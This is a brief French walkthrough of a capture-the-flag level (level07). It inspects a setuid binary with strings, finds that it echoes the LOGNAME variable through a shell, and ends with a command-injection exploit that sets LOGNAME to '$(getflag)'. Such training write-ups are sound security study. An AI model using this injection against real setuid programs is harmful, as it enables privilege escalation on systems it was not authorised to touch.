P'tite routine
1. Check fichiers liés à flag07 : find / -type f -user flag07 2>/dev/null -> rien
2. ls -la -> ./level07
3. cat ./level07 -> c'est un binaire, en faisant les autres levels j'ai découvert strings
4. strings ./level07 -> c'est du C compilé, on voit du gcc, du level07.c
5. Quelques lignes suspectes qui se suivent : getenv, /bin/echo %s, setresuid, du shell dans le binaire
6. getenv = récup valuer d'une variable d'env, /bin/echo %s = affiche la valeur
7. just avant /bin/echo %s -> LOGNAME, donc le binaire echo $LOGNAME
8. Je sais qu'on peut lancer une commande avec echo en utilisant echo $(commande)
9. export LOGNAME='$(getflag)' && ./level07 -> gg